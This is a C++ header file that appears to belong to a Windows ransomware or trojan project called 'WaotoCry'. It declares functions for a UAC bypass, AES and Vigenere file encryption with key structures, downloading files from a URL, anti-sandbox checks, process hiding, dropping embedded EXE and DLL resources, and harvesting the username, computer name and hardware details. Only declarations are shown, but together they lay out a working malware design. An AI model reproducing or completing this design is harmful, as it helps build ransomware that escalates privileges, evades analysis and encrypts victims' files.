#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include  <direct.h>  
#include <tchar.h>
#include "resource.h"
#pragma comment(lib,"URlmon")
#pragma warning(disable :4996)
#define MAX_SIZE 255

using namespace std;




typedef struct 
{
	int Proconn_data;
	int process_break_sendbox;
	char* get_process_dir;
	char*  process_new_path;
	string process_pid_path;
	string target_process_path;
	string usl_path;	
	DWORD get_pid;
	BOOL search;
	BOOL off;
}WaotoCry;

typedef struct {
	string public_key;
	string private_key;
	string encryption_data;
	string uncryption_data;
}WaotoCry_encryption;





//static string file_Config_dir = "C:\\Users\\Public\\Documents\\dD0bB0";
static string file_Config_dir = "C:\\Process File\\dD0bB0";


//Bypass.cpp
int add_double_data(char* new_process_path);
int increase(char* start_process);
int search_regedit();
int BypassUAC();

//Encryption
int Encryption(char process_path);
int Aes_Encryption_Funtion(BYTE* ppassword, DWORD dwpasswordLength, BYTE* pData, DWORD& dwDatalength, DWORD dwBufferLength);//? AES加密模块
int AES_decrypt_Funtion(BYTE* pPassword, DWORD dwPasswordlength, BYTE* pData, DWORD& dwDataLength, DWORD dwbufferLength); //? AES解密模块
std::string extend_key(std::string& msg, std::string& key); //? vigenere创建新密钥模块
std::string encrypt_vigenere(std::string& msg, std::string& key); //? vigenere 加密模块
std::string decrypt_vigenere(std::string& encryptedMsg, std::string& newKey); //? vigenere 解密模块

//Connect
int download(string usl, string file_name);


//Funtions
string password();
void no_windows();
char *new_process_path(); //获取当前PROCESS路径
char *Get_Process_in_dir();
string replace_string(string no_replace, string need_relace_string, string befor_replace);//修改字符串内指定字符
int reaname(char *old_name, char *new_name); //Modifly file name 
string windows_username(); //! Get USERNAME
wstring windows_computer_name();  //! Get Computer name
bool windows_text(string eatablish_path); //! eatablsh catalogue


//Anti Sendbox
DWORD get_parent_processid(DWORD pid);
DWORD get_explorer_processid();
int determine();
DWORD GetProcesspId(const char* name);
string process_pid_to_path(DWORD process_pid);


//File operation
bool CreateMyFile(char* strFilePath, LPBYTE lpBuffer, DWORD dwSize);
bool CreateEXE(char* strFilePath, int nResourceID, char* strResourceName);
BOOL ReleaseDLLRes(LPCTSTR szDLLFullPath, UINT uResID, LPCTSTR szResType);//释放DLL到指定目录
char Getsystemtamppath(); //GetsystemTempPath



//kernel.cpp
int hide_process(string process);


//search_regedit_information.cpp
WCHAR search_regedit_CPU_information();//! 查询CPU型号
char search_regedit_GPU_information();
